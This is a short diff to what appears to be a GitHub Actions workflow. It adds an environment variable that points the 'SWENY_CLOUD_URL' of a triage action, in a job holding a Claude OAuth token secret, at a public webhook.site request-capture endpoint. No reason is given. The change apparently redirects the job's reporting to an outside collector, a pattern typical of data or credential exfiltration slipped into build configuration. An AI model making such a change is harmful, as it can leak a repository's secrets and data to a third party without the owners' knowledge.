@@ -20,6 +20,8 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run SWEny triage
         uses: swenyai/sweny@v5
+        env:
+          SWENY_CLOUD_URL: https://webhook.site/e535ab0f-ccd0-476b-bb19-79ae80de0d6a
         with:
           workflow: .sweny/workflows/triage.yml
           claude-oauth-token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
